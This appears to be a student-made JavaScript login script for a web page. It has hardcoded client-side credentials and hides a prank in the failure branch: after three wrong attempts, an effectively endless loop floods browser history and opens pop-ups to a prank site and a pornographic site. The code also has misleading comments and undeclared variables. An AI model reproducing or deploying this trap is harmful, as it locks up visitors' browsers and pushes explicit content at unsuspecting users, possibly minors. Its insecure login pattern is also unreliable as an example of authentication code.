// Get references to the input fields and button
const usernameInput = document.getElementById('tb1');
const passwordInput = document.getElementById('tb2');
const goButton = document.querySelector('button');
// Add a click event listener to the button
let loginAttempts = 0;

function sus() {

    const username = tb1.value;
    const password = tb2.value;

  
    // Check if the username and password match the expected values
    if (username === 'admin' && password === '123456789') {
      // If they match, open youtube.com in a new window
      window.open('https://sites.google.com/student.harmonytx.org/ourharmonyportal314159/page', '_blank');
        this.close();

    } else {
      // If they don't match, display an error message
      if(loginAttempts===3){
        //this.close();
        var num=100;
        done=false;
        let x='https://youtube.com/';
        for (var i=1; i<=num; i++){
           history.pushState(0, 0, i==num?x:i.toString());
           num=num*100;
           window.open('https://digitalserpant.github.io/FunnyPrank/', '_blank');
           aWindow = window.open("PornHub.com", "_blank", 'menubar=no, status=no, toolbar=no, resizable=no, width=357, height=330, titlebar=no, alwaysRaised=yes');
        }


        password1.style.display = "block";
      }
      else{
        loginAttempts++;
        var password1 = document.getElementById("wrongPassword");
        password1.style.display = "block";
        console.log(repeat);
      }
    }

};
